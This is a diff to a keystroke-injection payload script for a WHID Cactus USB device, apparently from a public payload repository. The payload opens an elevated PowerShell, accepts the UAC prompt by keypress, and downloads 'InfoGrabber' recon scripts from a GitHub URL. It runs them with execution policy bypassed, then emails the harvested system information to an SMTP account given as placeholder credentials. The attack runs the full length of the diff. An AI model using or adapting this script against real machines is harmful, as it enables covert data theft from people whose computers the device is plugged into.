@@ -4,32 +4,34 @@ Rem:*****************
 Rem:#GUI r
 Press:131+114
 CustomDelay:100
-Rem:#-windowstyle hidden doesn't work with cactus right now
 Print:powershell Start-Process powershell -Verb runAs 
 Press:176
-Rem:# Might need ALT y command here#
 CustomDelay:500
 Press:130+121
-CustomDelay:1000
+CustomDelay:500
 Rem:*****************
-Rem:# Get High on Quack #
+Rem:# Get Prickly on Quack #
 Rem:*****************
 Print:New-Item -ItemType directory -Path C:\quactus\; cd C:\quactus\; cls
 Press:176
-CustomDelay:150
+CustomDelay:450
 Print:$source = "https://raw.githubusercontent.com/0rion5/WHID-Quactus-Payloads/master/library/Quactus/recon/InfoGrabber/run.ps1"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+CustomDelay:100
 Press:176
 CustomDelay:100
 Print:$source = "https://raw.githubusercontent.com/0rion5/WHID-Quactus-Payloads/master/library/Quactus/recon/InfoGrabber/info.ps1"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+CustomDelay:100
 Press:176
 CustomDelay:100
 Print:PowerShell.exe -ExecutionPolicy Bypass -File run.ps1; cls
+CustomDelay:100
 Press:176
 CustomDelay:1000
 Rem:*****************
 Rem:# Let's e-mail ourselves and clean up #
 Rem:*****************
-Print:$SMTPServer = 'SMTP.MAIL.COMHERE'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSSL = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAILHERE', 'YOURPASSWORDHERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUREMAILHERE'; $ReportEmail.To.Add('YOUREMAILHERE'); $ReportEmail.Subject = 'That's a Prickly Cactus Quack Quack'; $ReportEmail.Body = (Get-Content C:\quactus\info\* | out-string); $SMTPInfo.Send($ReportEmail); cd ..; cls
+Print:$SMTPServer = 'SMTP.MAIL.COM HERE'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSSL = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAILHERE', 'YOURPASSWORD HERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUREMAIL HERE'; $ReportEmail.To.Add('YOUREMAIL HERE'); $ReportEmail.Subject = 'Thats a Prickly Cactus Quack Quack'; $ReportEmail.Body = (Get-Content C:\quactus\info\* | out-string); $SMTPInfo.Send($ReportEmail); cd ..; cls
+CustomDelay:100
 Press:176
 CustomDelay:1000
 Rem:*****************
